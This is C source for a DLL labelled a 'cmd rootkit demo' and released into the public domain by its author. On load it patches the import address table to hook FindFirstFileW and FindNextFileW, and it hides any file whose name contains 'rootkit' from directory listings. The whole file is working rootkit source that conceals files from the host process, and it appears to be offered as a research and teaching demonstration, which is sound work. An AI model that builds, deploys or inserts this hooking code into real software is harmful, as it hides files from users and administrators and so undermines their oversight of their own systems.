/*
	cmd rootkit demo
	Source code put in public domain by Didier Stevens, no Copyright
	https://DidierStevens.com
	Use at your own risk

	Shortcomings, or todo's ;-)
	
	History:
	2008/07/30: start
	2008/07/31: update
*/

#define _UNICODE 1

#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#include "iat.h"
#include "psutils.h"

#define KEYWORD _TEXT("rootkit")

BOOL g_bFindFirstFileHookInstalled = FALSE;
BOOL g_bFindNextFileHookInstalled = FALSE;

BOOL WINAPI HookFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);

HANDLE WINAPI (*OriginalFindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
    
HANDLE WINAPI HookFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
{
	HANDLE hResult;
	TCHAR szDebug[MAX_PATH];
	
	_sntprintf(szDebug, MAX_PATH-1, _TEXT("FindFirstFileW lpFileName = %s"), lpFileName);
	szDebug[MAX_PATH-1] = _TEXT('\0');
	OutputDebugStringW(szDebug);
	hResult = (*OriginalFindFirstFileW)(lpFileName, lpFindFileData);
	if (NULL != _tcsstr(lpFindFileData->cFileName, KEYWORD))
		HookFindNextFileW(hResult, lpFindFileData);
	if (NULL != _tcsstr(lpFindFileData->cFileName, KEYWORD))
	{
		_tcscpy(lpFindFileData->cFileName,_TEXT(""));
		hResult = INVALID_HANDLE_VALUE;
	}
	_sntprintf(szDebug, MAX_PATH-1, _TEXT("FindFirstFileW lpFindFileData->cFileName = %s"), lpFindFileData->cFileName);
	szDebug[MAX_PATH-1] = _TEXT('\0');
	OutputDebugStringW(szDebug);
	return hResult;
}

BOOL WINAPI (*OriginalFindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);

BOOL WINAPI HookFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	BOOL bResult;
	TCHAR szDebug[MAX_PATH];

	bResult = (*OriginalFindNextFileW)(hFindFile, lpFindFileData);
	if (bResult)
	{
		_sntprintf(szDebug, MAX_PATH-1, _TEXT("FindNextFileW lpFindFileData->cFileName = %s"), lpFindFileData->cFileName);
		szDebug[MAX_PATH-1] = _TEXT('\0');
		OutputDebugStringW(szDebug);
		if (NULL != _tcsstr(lpFindFileData->cFileName, KEYWORD))
			bResult = HookFindNextFileW(hFindFile, lpFindFileData);
	}
	return bResult;
}

#ifdef __BORLANDC__
#pragma warn -8057
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch(fdwReason) 
	{ 
	  case DLL_PROCESS_ATTACH:
		  OutputDebugString(_TEXT("Hook Hello DLL_PROCESS_ATTACH"));
	  	if (FALSE == g_bFindFirstFileHookInstalled)
	  	{
		  	if (S_OK == PatchIAT(GetProcessImageModule(GetCurrentProcessId()), "kernel32.dll", "FindFirstFileW", (PVOID) HookFindFirstFileW, (PVOID *) &OriginalFindFirstFileW))
					g_bFindFirstFileHookInstalled = TRUE;
				else
		  		OutputDebugString(_TEXT("Hooking failed."));
			}
	  	if (FALSE == g_bFindNextFileHookInstalled)
	  	{
		  	if (S_OK == PatchIAT(GetProcessImageModule(GetCurrentProcessId()), "kernel32.dll", "FindNextFileW", (PVOID) HookFindNextFileW, (PVOID *) &OriginalFindNextFileW))
					g_bFindNextFileHookInstalled = TRUE;
				else
		  		OutputDebugString(_TEXT("Hooking failed."));
			}
      break;
	
	  case DLL_THREAD_ATTACH:
      break;
	
	  case DLL_THREAD_DETACH:
      break;
	
	  case DLL_PROCESS_DETACH:
		  OutputDebugString(_TEXT("Unhook Hello DLL_PROCESS_DETACH"));
	  	if (TRUE == g_bFindFirstFileHookInstalled)
	  	{
		  	if (S_OK == PatchIAT(GetProcessImageModule(GetCurrentProcessId()), "kernel32.dll", "FindFirstFileW", (PVOID) OriginalFindFirstFileW, NULL))
					g_bFindFirstFileHookInstalled = FALSE;
				else
		  		OutputDebugString(_TEXT("Unhooking failed."));
			}
	  	if (TRUE == g_bFindNextFileHookInstalled)
	  	{
		  	if (S_OK == PatchIAT(GetProcessImageModule(GetCurrentProcessId()), "kernel32.dll", "FindNextFileW", (PVOID) OriginalFindNextFileW, NULL))
					g_bFindNextFileHookInstalled = FALSE;
				else
		  		OutputDebugString(_TEXT("Unhooking failed."));
			}
      break;
	}
	
	return TRUE;
}

#ifdef __BORLANDC__
#pragma warn +8057
#endif
